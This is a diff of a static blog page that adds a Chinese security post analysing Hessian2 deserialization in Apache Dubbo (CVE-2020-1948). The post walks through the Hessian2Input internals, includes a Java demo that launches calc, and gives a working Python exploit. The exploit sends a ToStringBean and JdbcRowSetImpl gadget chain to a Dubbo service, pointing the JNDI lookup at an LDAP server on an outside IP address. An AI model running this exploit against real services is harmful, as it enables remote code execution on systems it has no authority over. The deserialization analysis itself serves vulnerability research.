@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">rss | popko&#39;s Blog</title>
+  <title itemprop="name">Hessian2反序列化 | popko&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -164,12 +164,333 @@
   </div>
 </header>
 
-        <div class="pattern-center-blank"></div>
-  
-  <div id="content" class="site-content">
-    <article class="post-item post-301 page type-page status-publish has-post-thumbnail hentry">
-      
-      <!-- .entry-content -->
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      Hessian2反序列化</h1>
+      <p class="entry-census">
+        <span>
+          <a href="popko.top">
+            <img src="https://www.popko.top/img/custom/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="popko.top">popko</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2022-4-1<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h2 id="Hessian2"><a href="#Hessian2" class="headerlink" title="Hessian2"></a>Hessian2</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bitterz/p/15526206.html">https://www.cnblogs.com/bitterz/p/15526206.html</a></p>
+<h3 id="后反序列化利用"><a href="#后反序列化利用" class="headerlink" title="后反序列化利用"></a>后反序列化利用</h3><blockquote>
+<p>反序列化完成后，由于报错语句拼接，触发任意类toString方法</p>
+</blockquote>
+<p>CVE-2020-1948(dubbo漏洞.md)</p>
+<h3 id="反序列化利用-dubbo反序列化实现原理"><a href="#反序列化利用-dubbo反序列化实现原理" class="headerlink" title="反序列化利用//dubbo反序列化实现原理"></a>反序列化利用//dubbo反序列化实现原理</h3><blockquote>
+<p>能不能直接触发readObject反序列化呢?</p>
+<p>Hessian2ObjectInput重写的readObject只有类初始化和反射，没有原生readObject里的各种调用，也不像fastjson会触发setter,getter</p>
+<p>但是hashmap会触发put方法，可以作为gadget的入口</p>
+</blockquote>
+<h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><pre><code class="java">import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
+import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput;
+import java.io.*;
+import java.util.HashMap;
+
+public class unser1 &#123;
+    public static class MyHashMap&lt;K, V&gt; extends HashMap&lt;K, V&gt; &#123;
+
+        public V put(K key, V value) &#123;
+            super.put(key, value);
+            System.out.println(111111111);
+            try &#123;
+                Runtime.getRuntime().exec(&quot;calc&quot;);
+            &#125; catch (Exception e) &#123;
+            &#125;
+            System.out.println(22222222);
+            return null;
+        &#125;
+    &#125;
+
+    public static void main(String[] args) throws Exception&#123;
+//        MyHashMap map = new MyHashMap();
+//        HashMap map = new HashMap();
+//        map.put(&quot;1&quot;, &quot;1&quot;);//共两次calc
+        Person person = new Person();
+        person.setAge(20);
+        person.setHobby(&quot;acg&quot;);
+        person.setName(&quot;popko&quot;);
+        person.setSex(&quot;male&quot;);
+
+//        byte[] bytes = serialize(map);
+        byte[] bytes = serialize(person);
+        System.out.println(new String(bytes, 0, bytes.length));
+
+        Object o = unserialize(bytes);
+        System.out.println(o);
+    &#125;
+    public static Object unserialize(byte[] bytes) throws Exception&#123;
+        // hessian2的反序列化
+        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
+        Hessian2ObjectInput hessian2Input = new Hessian2ObjectInput(byteArrayInputStream);
+        Object o = hessian2Input.readObject();//共两次calc
+        return o;
+    &#125;
+    public static byte[] serialize(Object obj) throws Exception&#123;
+        // hessian2的序列化
+        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+        Hessian2ObjectOutput hessian2Output = new Hessian2ObjectOutput(byteArrayOutputStream);
+        hessian2Output.writeObject(obj);
+        hessian2Output.flushBuffer();
+        return byteArrayOutputStream.toByteArray();
+    &#125;
+&#125;
+</code></pre>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput</p>
+<pre><code class="java">    public &lt;T&gt; T readObject(Class&lt;T&gt; cls) throws IOException, ClassNotFoundException &#123;
+        return this.mH2i.readObject(cls);
+    &#125;
+</code></pre>
+<blockquote>
+<p>Hessian2Input也可以作为入口</p>
+</blockquote>
+<h5 id="Person-一般类-反序列化"><a href="#Person-一般类-反序列化" class="headerlink" title="Person(一般类)反序列化"></a>Person(一般类)反序列化</h5><p>com\alibaba\com\caucho\hessian\io\Hessian2Input.class</p>
+<pre><code class="java">    public Object readObject() throws IOException &#123;
+        return this.readObject((List)null);
+    &#125;
+</code></pre>
+<pre><code class="java">    public Object readObject(List&lt;Class&lt;?&gt;&gt; expectedTypes) throws IOException &#123;
+        ...
+        case 67:
+            this.readObjectDefinition((Class)null);
+            return this.readObject();
+</code></pre>
+<pre><code class="java">    private void readObjectDefinition(Class cl) throws IOException &#123;
+        String type = this.readString();
+        int len = this.readInt();
+        String[] fieldNames = new String[len];
+
+        for(int i = 0; i &lt; len; ++i) &#123;
+            fieldNames[i] = this.readString();
+        &#125;
+
+        Hessian2Input.ObjectDefinition def = new Hessian2Input.ObjectDefinition(type, fieldNames);
+        if (this._classDefs == null) &#123;
+            this._classDefs = new ArrayList();
+        &#125;
+
+        this._classDefs.add(def);
+    &#125;
+
+</code></pre>
+<p>再次this.readObject()-&gt;this.readObject((List)null)</p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220401170105707.png" alt="image-20220401170105707"></p>
+<pre><code class="java">    private Object readObjectInstance(Class cl, Hessian2Input.ObjectDefinition def) throws IOException &#123;
+        String type = def.getType();
+        String[] fieldNames = def.getFieldNames();
+        if (cl != null) &#123;
+            ...
+        &#125; else &#123;
+            return this.findSerializerFactory().readObject(this, type, fieldNames);
+        &#125;
+    &#125;
+</code></pre>
+<p>com\alibaba\com\caucho\hessian\io\SerializerFactory.class</p>
+<pre><code class="java">    public Object readObject(AbstractHessianInput in, String type, String[] fieldNames) throws HessianProtocolException, IOException &#123;
+        Deserializer deserializer = this.getDeserializer(type);//deserializer._type为Class Person
+        if (deserializer != null) &#123;
+            return deserializer.readObject(in, fieldNames);//跟进
+
+    public Deserializer getDeserializer(String type) throws HessianProtocolException &#123;
+        if (type != null &amp;&amp; !type.equals(&quot;&quot;) &amp;&amp; !this._typeNotFoundDeserializerMap.containsKey(type)) &#123;
+            ...
+            Deserializer deserializer = (Deserializer)_staticTypeMap.get(type);//基本数据类型及其数组
+            ...
+                    try &#123;
+                        Class cl = this.loadSerializedClass(type);
+                        deserializer = this.getDeserializer(cl);
+
+
+    public Class&lt;?&gt; loadSerializedClass(String className) throws ClassNotFoundException &#123;
+        return this.getClassFactory().load(className);//appclassloader
+    &#125;
+
+    public Class&lt;?&gt; load(String className) throws ClassNotFoundException &#123;
+        if (this.isAllow(className)) &#123;//黑名单
+            return Class.forName(className, false, this._loader);//Class.forName类加载//false,没有初始化
+        &#125; else &#123;
+            log.log(Level.SEVERE, className + &quot; in blacklist or not in whitelist, deserialization  with type &#39;HashMap&#39; instead.&quot;);
+            return HashMap.class;//不存在或在黑名单里则返回HashMap
+        &#125;
+    &#125;
+</code></pre>
+<p>com\alibaba\com\caucho\hessian\io\JavaDeserializer.class</p>
+<pre><code class="java">    public Object readObject(AbstractHessianInput in, String[] fieldNames) throws IOException &#123;
+        try &#123;
+            Object obj = this.instantiate();//类初始化
+            return this.readObject(in, obj, fieldNames);
+
+    public Object readObject(AbstractHessianInput in, Object obj, String[] fieldNames) throws IOException &#123;
+        try &#123;
+            int ref = in.addRef(obj);
+            for(int i = 0; i &lt; fieldNames.length; ++i) &#123;
+                String name = fieldNames[i];
+                JavaDeserializer.FieldDeserializer deser = (JavaDeserializer.FieldDeserializer)this._fieldMap.get(name);//获取属性
+                if (deser != null) &#123;
+                    deser.deserialize(in, obj);//跟进
+                &#125; else &#123;
+                    in.readObject();
+                &#125;
+            &#125;
+
+        void deserialize(AbstractHessianInput in, Object obj) throws IOException &#123;
+            String value = null;
+            try &#123;
+                value = in.readString();
+                this._field.set(obj, value);//反射设置属性
+            &#125; catch (Exception var5) &#123;
+                JavaDeserializer.logDeserializeError(this._field, obj, value, var5);
+            &#125;
+
+        &#125;
+
+    protected Object instantiate() throws Exception &#123;
+        try &#123;
+            return this._constructor != null ? this._constructor.newInstance(this._constructorArgs) : this._type.newInstance();//this._type.newInstance() 类初始化
+</code></pre>
+<h5 id="hashmap反序列化"><a href="#hashmap反序列化" class="headerlink" title="hashmap反序列化"></a>hashmap反序列化</h5><pre><code>    protected void doReadMap(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType) throws IOException &#123;
+        Deserializer keyDeserializer = null;
+        Deserializer valueDeserializer = null;
+        SerializerFactory factory = this.findSerializerFactory(in);
+        if (keyType != null) &#123;
+            keyDeserializer = factory.getDeserializer(keyType.getName());
+        &#125;
+
+        if (valueType != null) &#123;
+            valueDeserializer = factory.getDeserializer(valueType.getName());
+        &#125;
+
+        while(!in.isEnd()) &#123;
+            map.put(keyDeserializer != null ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != null ? valueDeserializer.readObject(in) : in.readObject());
+        &#125;
+    &#125;
+</code></pre><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>需要可用性，wireshark抓包太麻烦了，，</p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><pre><code class="python"># pip3 install dubbo-py
+import socket
+import binascii
+import re
+import time
+from dubbo.codec.hessian2 import Decoder, new_object
+from dubbo.client import DubboClient
+def exp1(ip,port):
+    client = DubboClient(ip,port)
+
+    JdbcRowSetImpl = new_object(
+        &#39;com.sun.rowset.JdbcRowSetImpl&#39;,
+        dataSource=&quot;ldap://150.158.172.182:1389/o=reference&quot;,
+        strMatchColumns=[&quot;foo&quot;]
+    )
+    JdbcRowSetImplClass = new_object(
+        &#39;java.lang.Class&#39;,
+        name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    )
+    toStringBean = new_object(
+        &#39;com.rometools.rome.feed.impl.ToStringBean&#39;,
+        beanClass=JdbcRowSetImplClass,
+        obj=JdbcRowSetImpl
+    )
+    # print(toStringBean)
+    # exit()
+    resp = client.send_request_and_return_response(
+        service_name=&#39;cn.rui0&#39;,
+        method_name=&#39;any&#39;,#&lt;=2.7.5
+        # service_name=&#39;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#39;,
+        # method_name=&#39;rceTest&#39;,
+        # service_version=&#39;1.0.0&#39;,
+        args=[toStringBean])
+
+    print(resp)
+    res = str(resp)
+    notfound = &quot;ClassNotFoundException: com.rometools.rome.feed.impl.ToStringBean&quot;
+    fix = &quot;arguments=[]&quot;
+    if notfound in res:
+        print(&quot;notfound depend&quot;)
+    elif fix in res:
+        print(&quot;already fix&quot;)
+    else:
+        print(&quot;success&quot;)
+
+ip=&#39;127.0.0.1&#39;
+port = 20880
+exp1(ip,port)
+</code></pre>
+<h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><p><a target="_blank" rel="noopener" href="https://github.com/lz2y/DubboPOC">https://github.com/lz2y/DubboPOC</a></p>
+<p>参考并进行修改，，，</p>
+<h3 id="虎符ezchain"><a href="#虎符ezchain" class="headerlink" title="虎符ezchain"></a>虎符ezchain</h3>
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/#"></li>
+                <li class="wechat-code"><img src="/#"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2022/03/24/cms%E6%BC%8F%E6%B4%9E3/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                cms漏洞3</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
 <div id="vcomments"></div>
 <script>
@@ -185,43 +506,25 @@
   }
 </script>
 
-      <div class="single-reward">
-        <div class="reward-open">赏
-          <div class="reward-main">
-            <ul class="reward-row">
-              <li class="alipay-code"><img src="/#"></li>
-              <li class="wechat-code"><img src="/#"></li>
-            </ul>
-          </div>
-        </div>
-      </div>
-      <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
-      <footer class="post-footer">
-        <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
-        <div class="post-tags">
-        </div>
-        <div class="post-share">
-          <div class="social-share sharehidden share-component"></div>
-          <i class="iconfont show-share icon-forward"></i>
-        </div>
-      </footer><!-- .entry-footer -->
-    </article>
-      <!-- #post-## -->
       <section class="author-profile">
         <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
-          <a href="/about/" class="profile gravatar"><img src="/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
+          <a href="popko.top" class="profile gravatar"><img src="https://www.popko.top/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
           <div class="meta">
             <span class="title">Author</span>
             <h3 itemprop="name">
-            <a href="https://pipimi110.github.io" itemprop="url" rel="author">popko</a>
+            <a href="popko.top" itemprop="url" rel="author">popko</a>
             </h3>
           </div>
         </div>
         <hr>
-        <p><i class="iconfont icon-write"></i>不是二刺螈，只是个喜欢acg和偶尔挖挖洞的阿宅</p>
+        <p><i class="iconfont icon-write"></i>otaku</p>
       </section>
+    </main><!-- #main -->
   </div><!-- #primary -->
 </div>
+
+
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
